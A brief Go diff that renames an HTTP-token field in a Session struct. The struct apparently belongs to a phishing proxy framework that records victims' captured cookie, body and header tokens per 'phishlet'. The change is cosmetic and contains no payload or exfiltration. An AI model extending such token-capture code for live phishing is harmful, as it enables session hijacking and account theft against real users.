@@ -45,7 +45,7 @@ type Session struct {
 	Custom       map[string]string
 	CookieTokens map[string]map[string]*CookieToken // domain → name → token
 	BodyTokens   map[string]string
-	HttpTokens   map[string]string
+	HTTPTokens   map[string]string
 	PuppetID     string
 	StartedAt    time.Time
 	CompletedAt  *time.Time // nil until all auth_tokens are captured
@@ -77,7 +77,7 @@ func (s *Session) HasRequiredTokens(def *PhishletDef) bool {
 				return false
 			}
 		case TokenTypeHTTPHeader:
-			if rule.Name != nil && s.HttpTokens[rule.Name.String()] == "" {
+			if rule.Name != nil && s.HTTPTokens[rule.Name.String()] == "" {
 				return false
 			}
 		}
